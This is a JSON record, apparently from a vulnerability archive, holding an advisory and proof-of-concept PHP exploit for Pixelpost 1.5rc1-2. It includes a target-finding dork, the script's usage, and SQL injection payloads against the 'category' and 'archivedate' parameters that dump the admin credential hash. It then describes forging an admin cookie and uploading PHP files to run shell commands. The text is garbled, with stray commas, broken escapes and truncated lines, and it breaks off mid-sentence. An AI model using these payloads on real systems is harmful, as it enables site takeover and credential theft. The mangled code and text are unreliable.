{
    "text": "vul_name : Pixelpost <= 1-5rc1-2 multiple vulnerabilities ， vul_cve : CVE-2006-2891 , CVE-2006-2890 , CVE-2006-2889 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \"Pixelpost <= 1-5rc1-2 privilege escalation exploitrn\" ;  ， echo \"by rgod rgod ( at ) autistici ( dot ) org [ email concealed ] rn\" ;  ， echo \"site :  ， echo \"dork : pixelpost \"RSS 2.0\" \"ATOM feed\" \"Valid xHTML / Valid CSS\"rnrn\" ;  ， works with :  ， magic_quotes_gpc=Off ， echo \"Usage : php \". $ argv [ 0 ] .\" host path your_ip cmd OPTIONSrn\" ;  ， echo \"host : target server ( ip/hostname ) rn\" ;  ， echo \"path : path to pixelpostrn\" ;  ， echo \"your ip : your actual ip adress , we need it to build an admin cookiern\" ;  ， echo \" this is automatically set to your proxy ip if you use onern\" ;  ， echo \"cmd : a shell commandrn\" ;  ， echo \"Options : rn\" ;  ， echo \" -T [ prefix ] specify a table prefix different from \"pixelpost_\"rn\" ;  ， echo \" -p [ port ]  : specify a port other than 80rn\" ;  ， echo \" -P [ ip : port ]  : specify a proxyrn\" ;  ， echo \"Examples : rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" a.b.c.d /pixelpost/ w.x.y.z cat ././includes/pixelpost.phprn\" ;  ， echo \"php \". $ argv [ 0 ] .\" a.b.c.d / w.x.y.z ls -la -p81rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" a.b.c.d / none ls -la -P1.1.1.1 : 80rn\" ;  ， die ;  ， } ， / * software site :  ， description : \"A small photoblog application that's a no-brainer to set up and ， use - this is truly for anyone wishing regularly to post their photos on the ， web like a blog.\" ， i ) sql injection in index.php near lines 670-680 :  ， . ， { ， / Modified from Mark Lewin's hack for multiple categories ，  $ query = mysql_query ( \"SELECT 1 , t2.id , headline , image , datetime ， FROM { $ pixelpost_db_prefix}catassoc as t1 ， INNER JOIN { $ pixelpost_db_prefix}pixelpost t2 on t2.id = t1.image_id ， WHERE t1.cat_id = '\". $ _GET [ 'category' ] .\"' ， AND ( datetime <= ' $ cdate' )  ， ORDER BY datetime DESC\" )  ;  ，  $ lookingfor = 1 ;  ， } ， . ， nice code , isn't it? ， with magic_quotes_gpc = Off :  ， SELECT '1' , '2' , admin , '4' , '5' FROM pixelpost_config WHERE id=1/ *  ， SELECT '1' , '2' , password , '4' , '5' FROM pixelpost_config WHERE id=1/ *  ， now , at screen , you have admin username & MD5 password hash and you can build ， an admin cookie :  ， Cookie : pp_user= [ username ]  ; pp_password= [ sha1 (  [ md5hash ] . [ your_ip_address ]  )  ]  ;  ， Admin can upload .php files in images/ folder , files are renamed but you can ， see new filename in main index page , so. you launch commands :  ， ncludes/pixelpost.php ， ii ) same kind of sql injection in 'archivedate' argument at lines 681-687 :  ， . ， ELSE IF (  $ _GET [ 'archivedate' ]  ! = \" )  ， { ，  $ where = \"AND ( DATE_FORMAT ( datetime , '%Y-%m' ) ='\". $ _GET [ 'archivedate' ] .\"' ) \" ; /DATE_FORMAT ( foo , '%Y-%m-%d' )  ，  $ query = mysql_query ( \"SELECT 1 , id , headline , image , datetime FROM \". $ pixelpost_db_prefix.\"pixelpost WHERE ( datetime <= ' $ cdate' )  $ where ORDER BY datetime desc\" )  ;  ，  $ lookingfor = 1 ;  ， } ， . ， poc :  ， T%20'1' , '2' , password , '4' , '5'%20FROM%20pixelpost_config/ *  ， iii )  ， in admin/ folder at the begin of every script , except for index.php , we have : ",
    "time": "2006.06.08"
}